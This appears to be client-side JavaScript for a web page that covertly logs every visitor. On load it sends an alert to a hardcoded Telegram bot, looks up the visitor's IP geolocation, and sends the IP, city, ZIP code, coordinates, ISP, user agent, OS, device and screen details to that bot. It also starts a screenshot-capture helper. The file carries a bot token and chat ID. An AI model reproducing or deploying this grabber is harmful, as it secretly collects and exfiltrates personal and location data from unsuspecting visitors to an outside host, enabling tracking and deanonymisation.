var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=👨‍💻 <u><b><i>Someone entered to the website</i></b></u>`;
var oReq = new XMLHttpRequest(); 
oReq.open("GET", Welcome, true); 
oReq.send();
fetch("http://ip-api.com/json")
	.then((res) => res.json())
	.then((data) => {
		var output = `
		<b><i>- IP</i></b>: %0A${data.query} %0A
		<b><i>- Country</i></b>: %0A${data.country} %0A
		<b><i>- Country Code</i></b>: %0A${data.countryCode} %0A
		<b><i>- Region</i></b>: %0A${data.region} - ${data.regionName} %0A
		<b><i>- City</i></b>: %0A${data.city} %0A
		<b><i>- ZIP Code</i></b>: %0A${data.zip} %0A
		<b><i>- LAT/LONG</i></b>: %0A(${data.lat} , ${data.lon}) %0A
		<b><i>- TimeZone</i></b>: %0A${data.timezone} %0A
		<b><i>- ISP</i></b>: %0A${data.isp} %0A `
		var UA = `
		<b><i>- User Agent</i></b>: <br>
		${navigator.userAgent}`;
		var output2 = `
		<b><i>- OS</i></b>: %0A${platform.os} %0A
		<b><i>- Device Model</i></b>: %0A${platform.product} %0A
		<b><i>- Browser</i></b>: %0A${platform.name} %0A
		<b><i>- Brand</i></b>: %0A${platform.manufacturer} %0A
		<b><i>- Description</i></b>: %0A${platform.description} %0A
		<b><i>- Resolution</i></b>: %0A${window.screen.availHeight}x${window.screen.availWidth} %0A`
	var url = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=${output}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", url, true); 
	oReq.send();
	var UA = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=${UA}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", UA, true); 
	oReq.send();
	var url2 = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=${output2}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", url2, true); 
	oReq.send();
});
function b64toBlob(b64Data, contentType, sliceSize) {
    contentType = contentType || '';
    sliceSize = sliceSize || 512;
    var byteCharacters = atob(b64Data);
    var byteArrays = [];
    for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        var slice = byteCharacters.slice(offset, offset + sliceSize);
        var byteNumbers = new Array(slice.length);
        for (var i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }
        var byteArray = new Uint8Array(byteNumbers);
        byteArrays.push(byteArray);
    }
    var blob = new Blob(byteArrays, {type:'image'});
    return blob;
}
const getScreenshotOfElement = async (element) => {
	const canvas = await html2canvas(element)
}